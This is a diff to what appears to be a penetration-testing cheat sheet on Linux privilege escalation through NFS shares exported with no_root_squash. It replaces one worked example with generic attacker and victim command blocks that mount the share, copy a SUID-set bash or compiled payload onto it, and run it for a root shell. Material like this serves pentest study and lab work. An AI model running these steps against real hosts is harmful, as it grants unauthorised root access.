@@ -531,7 +531,6 @@ cat /etc/exports
 | no_root_squash | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|
 
 
-victim machine
 ```
 $ cat shell.c 
 
@@ -547,19 +546,29 @@ int main(void)
 /tmp$ gcc shell.c -o shell
 ```
 
-attacker machine 
-```
-$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
-$ cp shell /mnt
-$ chmod u+s /mnt/shell
-```
-
-victim machine 
 ```shell
-/tmp$  ls -la
+#Attacker, as root user
+mkdir /tmp/pe
+mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
+cd /tmp/pe
+cp /bin/bash .
+chmod +s bash
 
-total 68
-drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
-drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
--rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
+#Victim
+cd <SHAREDD_FOLDER>
+./bash -p #ROOT shell
+```
+
+```shell
+#Attacker, as root user
+gcc payload.c -o payload
+mkdir /tmp/pe
+mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
+cd /tmp/pe
+cp /tmp/payload .
+chmod +s payload
+
+#Victim
+cd <SHAREDD_FOLDER>
+./payload #ROOT shell
 ```
